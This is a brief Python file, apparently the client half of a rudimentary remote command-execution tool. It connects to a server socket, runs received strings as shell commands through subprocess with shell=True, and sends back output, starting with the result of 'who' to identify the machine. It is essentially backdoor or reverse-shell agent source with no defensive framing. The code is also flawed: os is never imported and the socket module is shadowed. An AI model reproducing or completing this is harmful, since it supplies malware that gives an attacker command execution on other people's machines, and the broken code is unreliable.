import socket
import pickle
import subprocess

#||||||||||||||||||||||||||||||CLIENT||||||||||||||||||||||||||

socket = socket.socket()
serverAddress = '127.0.0.1', 1111


def popenExecution(data):

    if data[:2] == 'cd': 
        os.chdir(str(data[3:]))

    command = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, 
    stderr=subprocess.PIPE, stdin=subprocess.PIPE)

    return str(command.stdout.read() + command.stderr.read(), "utf-8")


def main():
    
    while True:
        try:
            socket.connect(serverAddress)
            #Standard command to identify who this machine is
            socket.send(pickle.dumps(popenExecution("who").split()[0]))
            break
        except:
            socket.close()
            break


main()
